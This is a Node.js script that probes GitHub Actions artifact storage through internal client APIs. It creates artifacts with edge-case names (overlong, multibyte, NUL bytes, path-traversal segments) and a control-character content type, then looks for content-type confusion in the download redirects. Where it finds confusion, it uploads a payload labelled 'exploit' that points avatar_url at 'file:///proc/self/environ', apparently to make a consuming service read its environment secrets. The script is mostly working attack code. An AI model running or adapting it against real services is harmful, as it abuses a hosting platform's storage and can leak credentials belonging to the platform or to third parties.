import { createHash } from 'node:crypto';
import { BlobClient } from '@azure/storage-blob';
import { internalArtifactTwirpClient } from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import { getBackendIdsFromToken } from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import { StringValue } from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient();
const repository = process.env.GITHUB_REPOSITORY;
const weird = '\u0085application/json';
const placeholder = Buffer.from('{"probe":"long-name-boundary"}');
const runTag = String(process.env.GITHUB_RUN_ID || Date.now());

async function create(name, version, mime) {
  const result = await client.CreateArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, version, mimeType: StringValue.create({value: mime}),
  });
  if (!result.ok) throw new Error('CreateArtifact returned ok=false');
  return result;
}

async function upload(url, body) {
  await new BlobClient(url).getBlockBlobClient().uploadData(body, {
    blobHTTPHeaders: {blobContentType: weird},
  });
}

async function finalize(name, body) {
  const digest = createHash('sha256').update(body).digest('hex');
  const result = await client.FinalizeArtifact({
    workflowRunBackendId: ids.workflowRunBackendId,
    workflowJobRunBackendId: ids.workflowJobRunBackendId,
    name, size: String(body.length),
    hash: StringValue.create({value: `sha256:${digest}`}),
  });
  if (!result.ok) throw new Error('FinalizeArtifact returned ok=false');
  return String(result.artifactId);
}

async function inspect(id) {
  const url = `https://api.github.com/repos/${repository}/actions/artifacts/${id}/zip`;
  const response = await fetch(url, {redirect: 'manual', headers: {
    Authorization: `Bearer ${process.env.GH_TOKEN}`,
    Accept: 'application/vnd.github.v3+json',
    'User-Agent': 'repo-cassette-long-name-probe',
  }});
  if (response.status !== 302) return {id, status: response.status};
  const location = response.headers.get('location');
  const rsct = new URL(location).searchParams.get('rsct');
  if (rsct === 'application/json' || rsct === 'application/zip') return {id, status: 302, rsct};
  const blob = await fetch(location);
  return {id, status: blob.status, rsct, contentType: blob.headers.get('content-type')};
}

function sharedPrefix(label, size) {
  const start = `long-${runTag}-${label}-`;
  return start + 'a'.repeat(Math.max(0, size - start.length));
}

const cases = [];
for (const size of [63, 127, 255, 511, 1023]) {
  const common = sharedPrefix(`ascii${size}`, size);
  cases.push({label: `ascii-${size}`, names: [common + 'X', common + 'Y']});
}
const multi = `long-${runTag}-utf8-` + 'é'.repeat(128);
cases.push({label: 'utf8-256-plus', names: [multi + 'X', multi + 'Y']});
const surrogate = `long-${runTag}-utf16-` + '𝄞'.repeat(128);
cases.push({label: 'utf16-256-plus', names: [surrogate + 'X', surrogate + 'Y']});
const special = `long-${runTag}-special`;
cases.push({label: 'nul-tail', names: [`${special}\u0000X`, `${special}\u0000Y`]});
cases.push({label: 'nul-prefix', names: [`${special}X\u0000Q`, `${special}X`]});
cases.push({label: 'slash-dot', names: [`${special}/./X`, `${special}/X`]});
cases.push({label: 'slash-dotdot', names: [`${special}2/Y/../X`, `${special}2/X`]});

for (let index = 0; index < cases.length; index += 1) {
  const {label, names} = cases[index];
  const pair = index % 2
    ? [[names[0], 7, 'application/json'], [names[1], 6, weird]]
    : [[names[0], 6, weird], [names[1], 7, 'application/json']];
  const shape = names.map(name => ({chars: name.length, bytes: Buffer.byteLength(name)}));
  try {
    const attempts = await Promise.allSettled(pair.map(([name, version, mime]) => create(name, version, mime)));
    if (attempts.some(item => item.status === 'rejected')) {
      console.log(`REJECT ${JSON.stringify({label, shape, status: attempts.map(item => item.status === 'fulfilled' ? 'ok' : String(item.reason?.message).slice(0, 150))})}`);
      continue;
    }
    const created = attempts.map(item => item.value);
    const blobPathHashes = created.map(item => createHash('sha256').update(new URL(item.signedUploadUrl).pathname).digest('hex').slice(0, 12));
    await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));
    const finalized = await Promise.allSettled(pair.map(([name]) => finalize(name, placeholder)));
    const artifactIds = [...new Set(finalized.filter(item => item.status === 'fulfilled').map(item => item.value))];
    const representations = await Promise.all(artifactIds.map(inspect));
    console.log(`RESULT ${JSON.stringify({label, shape, blobPathHashes, artifactIds, finalized: finalized.map(item => item.status), representations})}`);
    const mixed = representations.find(item => item.contentType?.includes('\u0085'));
    if (mixed) {
      const exploit = Buffer.from(JSON.stringify({
        full_name: `${repository}/actions/artifacts/${mixed.id}/zip`,
        owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
        description: 'Repo Cassette name-boundary candidate', stargazers_count: 0,
      }));
      await Promise.all(created.map(item => upload(item.signedUploadUrl, exploit)));
      console.log(`MIXED ${JSON.stringify({label, artifactId: mixed.id, repository: `${repository}/actions/artifacts/${mixed.id}/zip`})}`);
    }
  } catch (error) {
    console.log(`SKIP ${JSON.stringify({label, shape, error: String(error.message).slice(0, 200)})}`);
  }
}
